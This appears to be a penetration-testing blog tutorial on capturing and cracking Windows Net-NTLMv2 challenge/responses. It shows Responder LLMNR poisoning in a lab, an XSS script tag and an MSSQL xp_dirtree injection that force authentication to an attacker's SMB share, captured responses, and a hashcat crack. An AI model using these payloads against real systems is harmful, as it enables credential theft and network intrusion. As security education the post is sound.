# Getting Creds via NTLMv2

[responder](/tags#responder ) [mitm](/tags#mitm ) [net-ntlmv2](/tags#net-
ntlmv2 ) [hashcat](/tags#hashcat ) [llmnr](/tags#llmnr ) [wpad](/tags#wpad )
[xp-dirtree](/tags#xp-dirtree )  
  
Jan 13, 2019

Getting Creds via NTLMv2

![](https://0xdfimages.gitlab.io/img/responder-cover.png)

One of the authentication protocols Windows machines use to authenticate
across the network is a challenge / response / validation called Net-NTLMv2.
If can get a Windows machine to engage my machine with one of these requests,
I can perform an offline cracking to attempt to retrieve their password. In
some cases, I could also do a relay attack to authenticate directly to some
other server in the network. I’ve run into an interesting case of this
recently that were worth sharing. In this post, I’ll focus on ways to get a
host to send you a challenge / response. If you’re interested in relaying,
leave a command and I’ll consider that too.

## NTLMv2

### Background

NTLMv2 (or more formally Net-NTLMv2) is a challenge-response authentication
protocol that Windows clients use to authenticate to other Windows servers. It
basically works like this:

![1546862052478](https://0xdfimages.gitlab.io/img/1546862052478.png)

  1. The client sends a request to authenticate, with parameters about about the connection.
  2. The server sends back a nonce, a random 16 bytes that shouldn’t ever be repeated.
  3. The client encrypts that nonce with it’s password, and sends it back.
  4. In the case of non-domain authentication, the server knows the password, so it can decrypt the response, and see if it matches the original nonce. If so, it grants access.

In a domain environment, the only different is that the server would forward
the username, nonce, and encrypted nonce to a domain controller, where the DC
could use the users hash to encrypt the nonce and see if it matches the one
from the user.

I won’t go into much more depth about how the encryption works, other than to
say that the thing used to do the encryption is the user’s password / hash.
NTLMv2 allows a client to authenticate with the server without sending its
password in plaintext. The risk, however, is that anyone with access to the
nonce and the encrypted nonce and perform an offline cracking attack, guessing
passwords and checking if it decrpyts correctly.

### NTLMv2 vs Kerberos

Most of the network authentication traffic you’ll see today is over Kerberos
as opposed to NTLMv2. Kerberos offers many advantages over NTLMv2 (though it
is by no means perfect). However, it is still very difficult to disable NTLMv2
entirely on a network. Because Kerberos relies on Service Principle Names, in
the default settings, anytime an IP address is used to reference the server
(ie `\\10.10.10.10` instead of `\\file-server`), Kerberos won’t work, and
authentication will fall back to NTLMv2. Additionally, many older systems and
devices (like printers) don’t support Kerberos and rely on NTLMv2.

### NTLM vs NTLMv2

Windows stores hashes locally as LM-hash and/or NThash. Unforatunately for the
sake of this conversation, the NTHash is often referred to as the NTLM hash
(or just NTLM). This is completely different from the term NTLMv2, which is
really short for Net-NTLMv2, which refers to the authentication protocol.
Within that protocol, it does make use of the Windows NT and/or LM hashes to
encrypt the response, and that response is sometimes even referred to as an
NTLMv2 hash (though I’d try to avoid that to be tight in your language).

## Attacks

There are two kinds of attacks to perform against Net-NTLMv2, depending on the
scenario and where you sit as an attacker.

### Crack Password

Once a client tries to authenticate to my machine, and I capture the encrypted
nonce, and I can use `hashcat` or `john` to brute force guess passwords and
see if any can encrypt the nonce to match the already encrypted version. This
only works if the user has a weak password that can be guessed. On successful
crack, I’ll have the account’s password to use as I see fit.

### Relay

The relay attack is a bit more clever. To use this, I’ll need to be in
position to talk to some other server that the client would typically
authenticate to. From there, it looks like this:

![1546864214990](https://0xdfimages.gitlab.io/img/1546864214990.png)

Once the client tries to authenticate to the attacker, the attacker tries to
authenticate to the server as the client’s account. It gets back a nonce,
which it forwards to the client to encrypt. The client does, and sends to the
attacker, who sends it to the server as if they had encrypted it. The server
authenticates the attacker, and the attacker tells the client sorry. At this
point, the attacker is authenticated to the server as the client’s user.

The client doesn’t have to be trying to access the target server. It could be
trying to access any server. But as long as it is trying to authenticate to
the attacker box, the attacker can use that to get access to any server the
client could legitimately authenticate to.

## Tools

### Responder

`responder` is an awesome tool for performing this kind of attack. It will
handle all sorts of poisoning options for you (I’ll give examples in the next
section). It will listen and display examples of challenges and responses from
various uses. I’ll just show it in a basic mode here, but it can do so much.
ivoidwarrenties.tech has a great [responder cheat
sheet](https://www.ivoidwarranties.tech/posts/pentesting-
tuts/responder/cheatsheet/).

### smbserver.py

Impactet’s smbserver.py will print out the NTLMv2 when a client connects. So
if you don’t need all the poisoning options, it can be simpler just to
collect.

### Relay Tools

There are other tools I can use to do a relay attack, but that’s beyond the
scope of this post.

## Enticing Authentication

### Background

When I think about this kind of attack, there are two common scenarios that
come to mind. The first is sitting in a network, and using that access to
poison responses to trick a client to talking to you. That poisoning could be
Link-Local Multicast Name Resolution, Arp, or WPAD. The second is getting a
user interact with an SMB share I control. Recently, I came across another
interesting scenario that led to my tricking a client to authenticate back to
me using SQL-Injection. I’ll show MitM, user interaction, and SQLI examples
below.

### Man in the Middle Attacks

#### Overview

Once sitting on the same network as a target, there are lots of ways to get
that target to talk to you.

  * While loud and detectable, arp poisining would allow you to have a target send all it’s traffic through you.
  * Web Proxy Auto-Discovery (WPAD) is a feature on Windows such that when browsers open, they will reach out to “wpad.domain” for the host’s current domain.

![1546868354534](https://0xdfimages.gitlab.io/img/1546868354534.png)

Many environments don’t have a server replying, but even if there is one, if I
can respond first, I can tell the system to come to me for a policy and get
them to auth.

  * Link-Local Multicast Name Resolution (LLMNR) is a feature on a Windows network that is hard to turn off because older things rely on it. LLMNR is a multicast request to the local subnet looking to resolve a hostname into an IP address. By listening for these, I can poison the reply and get the traffic sent to me.

#### LLMNR Poisoning Example

I’ve give an example of a MitM attack using `responder` to poison LLMNR
requests. For my set up, I have a VM running Windows Server 2008 and my Kali
workstation.

First, I’ll start responder on Kali. It will show me all the things it’s
listening on / poisoning, and then wait:

    
    
    root@kali# responder -I eth0
                                             __
      .----.-----.-----.-----.-----.-----.--|  |.-----.----.
      |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
      |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                       |__|
    
               NBT-NS, LLMNR & MDNS Responder 2.3.3.9
    
      Author: Laurent Gaffie (laurent.gaffie@gmail.com)
      To kill this script hit CRTL-C
    
    
    [+] Poisoners:
        LLMNR                      [ON]
        NBT-NS                     [ON]
        DNS/MDNS                   [ON]
    
    [+] Servers:
        HTTP server                [ON]
        HTTPS server               [ON]
        WPAD proxy                 [OFF]
        Auth proxy                 [OFF]
        SMB server                 [ON]
        Kerberos server            [ON]
        SQL server                 [ON]
        FTP server                 [ON]
        IMAP server                [ON]
        POP3 server                [ON]
        SMTP server                [ON]
        DNS server                 [ON]
        LDAP server                [ON]
    
    [+] HTTP Options:
        Always serving EXE         [OFF]
        Serving EXE                [OFF]
        Serving HTML               [OFF]
        Upstream Proxy             [OFF]
    
    [+] Poisoning Options:
        Analyze Mode               [OFF]
        Force WPAD auth            [OFF]
        Force Basic Auth           [OFF]
        Force LM downgrade         [OFF]
        Fingerprint hosts          [OFF]
    
    [+] Generic Options:
        Responder NIC              [eth0]
        Responder IP               [10.1.1.151]
        Challenge set              [random]
        Don't Respond To Names     ['ISATAP']
    
    
    
    [+] Listening for events...
    

If I then switch to the windows host, and try to visit a network path that
doesn’t exist (like `\\badservername\share\`), an LLMNR request will go out.
It will try for several seconds to connect, and eventually fail.

[

![](https://0xdfimages.gitlab.io/img/responder-llmnr-poison.gif)

](https://0xdfimages.gitlab.io/img/responder-llmnr-poison.gif)_Click on the
gif for a larger version_

But in failing, I’ve captured a challenge/response, and that’s something I can
crack:

![1546870562452](https://0xdfimages.gitlab.io/img/1546870562452.png)

You might say “sure, but in the real world, how often are people visiting non-
existing hosts?” That’s fair, but on a large network, the odds that if you
wait long enough someone will make a typo in a share name are pretty good.

### User Interaction

#### Overview

Another way to get a NTLMv2 is to get the user to visit my SMB share. This is
commonly seen in phishing campaigns that send `file://` links in email. A more
interesting case I recently ran into was using XSS. Anything can work, as long
as I can get the user to connect to my share. Once you trick the user into
visiting the share and entering their credentials, you’ve got a ntlmv2 to
break.

#### XSS Example

I’ll use a cross site scripting example, because it’s more interesting then
clicking on a link. I’ll start by injecting the following javascript into the
webpage:

    
    
    <script language='javascript' src="\\10.10.14.15\share"></script>
    

I’m using a HackTheBox host as an example, but going down a path that isn’t
useful for solving this host. Now, on loading the page:

![1547379369762](https://0xdfimages.gitlab.io/img/1547379369762.png)

When the target user enters creds, they come back as a ntlmv2 to responder:

    
    
    [HTTP] NTLMv2 Client   : 10.10.14.15
    [HTTP] NTLMv2 Username : \0xdf
    [HTTP] NTLMv2 Hash     : 0xdf:::019cef6365b05c2c:BA19872D0F64B8435D17CF3B95FE1709:010100000000000000030E4D34ABD401E3F54FBC526BD95A000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0000000000
    

### Database Access

Another example from a recent and live CTF involved getting access to a
Windows SQL database through injection. There’s a neat write-up of the details
to this attack here: https://www.gracefulsecurity.com/sql-injection-out-of-
band-exploitation/.

The short version is that if I can get the database to request a file from me,
I can capture the credentials associated with the database service.

Since Windows MSSQL allows stacked commands (ie, just adding `; [another
statement]`), I can inject by adding `EXEC master..xp_dirtree "\\[my
ip]\test"; --`. This will cause the db to request the file from me.

I’ll see this on responder (redacted to prevent spoiling the live event):

    
    
    [SMBv2] NTLMv2-SSP Client   : [redacted IP]
    [SMBv2] NTLMv2-SSP Username : [redacted hostname]\[redacted username]
    [SMBv2] NTLMv2-SSP Hash     : [username]::[hostname]:fad457a0c6a2a683:[nonce]:[0101000000000000C0653150DE09D20169BDEACF1D6C4559000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000E7EAB54BF6DDB8750C1DE7FF6085C5C46931758545C8F966D002E0D90701BE740A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003500000000000000000000000000]
    [*] Skipping previously captured hash for [hostname]\[username]
    [*] Skipping previously captured hash for [hostname]\[username]
    [*] Skipping previously captured hash for [hostname]\[username]
    

### Additional Reading

Since originally posting, someone shared with me [this link from
osandamalith.com](https://osandamalith.com/2017/03/24/places-of-interest-in-
stealing-netntlm-hashes/), which is too good not to add here. It has more than
20 examples of ways to get NetNTLM challenge/responses.

## Cracking NTLMv2

### Note About NTLMv2 Challenge/Responses

You’ll often people call these things hashes. But it’s useful to remember what
they really are. A nonce (random bit of data that should never repeat)
encrypted with the account credentials. That means if you collect one from the
same account it will be comepletely different each time, unless the same nonce
and account are used, which _should_ never happen.

### Hashcat

Once I have the challenge and response in hand, I can take that to `hashcat`
to crack it. I’ll use the example from my local box where I did LLMNR
poisoning.

The NTLMv2 that came back was:

    
    
    Administrator::WIN-487IMQOIA8E:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
    

If I run that in `hashcat`, I’ll see the password of “P@ssword”:

    
    
    $ hashcat -m 5600 administrator-ntlmv2 /usr/share/wordlists/rockyou.txt  --force
    hashcat (v4.0.1) starting...
    ...[snip]...
    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Dictionary cache hit:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344385
    * Bytes.....: 139921507
    * Keyspace..: 14344385
    
    - Device #1: autotuned kernel-accel to 1024
    - Device #1: autotuned kernel-loops to 1
    ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
    ...[snip]...
    

[](/2019/01/13/getting-net-ntlm-hases-from-windows.html)

